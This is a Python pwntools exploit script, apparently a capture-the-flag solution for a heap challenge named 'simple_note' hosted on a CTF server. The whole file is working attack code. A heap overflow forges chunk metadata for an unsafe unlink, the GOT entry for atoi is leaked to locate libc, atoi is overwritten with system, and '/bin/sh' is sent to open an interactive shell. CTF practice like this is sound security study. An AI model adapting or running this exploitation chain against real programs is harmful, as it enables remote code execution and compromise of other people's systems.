from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

bin = ELF('./simple_note')

local = 0

if local:
	cn = process('./simple_note')
	libc = ELF('./libc.so')
else:
	cn = remote('pwn1.chal.ctf.westerns.tokyo', 16317)
	libc = ELF('./remote_libc.so')

def z():
	gdb.attach(cn)
	raw_input()
	

def add(con,lens):
	cn.recvuntil('choice:')
	cn.sendline('1')
	cn.recvuntil(':')
	cn.sendline(str(lens))
	cn.recvuntil(':')
	cn.send(con)

def edit(idx,con):
	cn.recvuntil('choice:')
	cn.sendline('4')
	cn.recvuntil(':')
	cn.sendline(str(idx))
	cn.recvuntil(':')
	cn.send(con)

def dele(idx):
	cn.recvuntil('choice:')
	cn.sendline('2')
	cn.recvuntil(':')
	cn.sendline(str(idx))

def show(idx):
	cn.recvuntil('choice:')
	cn.sendline('3')
	cn.recvuntil(':')
	cn.sendline(str(idx))


chunklist=0x00000000006020C0

p2 = chunklist+8*3
for i in range(5):
	if i==3:
		add(chr(ord('A')+i)*0x108,0x108)
	else:
		add(chr(ord('A')+i)*0x88,0x88)

pay = p64(0)+p64(0x101)+p64(p2-0x18)+p64(p2-0x10)
pay = pay.ljust(0x100,'3')
pay += p64(0x100)+chr(0x90)
print hex(len(pay))
edit(3,pay)

#z()
dele(4)#unlink

pay = p64(bin.got['atoi'])[:3]
edit(3,pay)

show(0)

cn.recvuntil('Note: \n')
data = cn.recvuntil('\n')[:-1]
atoi = u64(data.ljust(8,'\x00'))
print hex(atoi)
system = atoi-libc.symbols['atoi']+libc.symbols['system']
print hex(system),hex(libc.symbols['system'])

edit(0,p64(system)[:6])
cn.recvuntil('choice:')
cn.sendline('/bin/sh\x00')

#z()



cn.interactive()


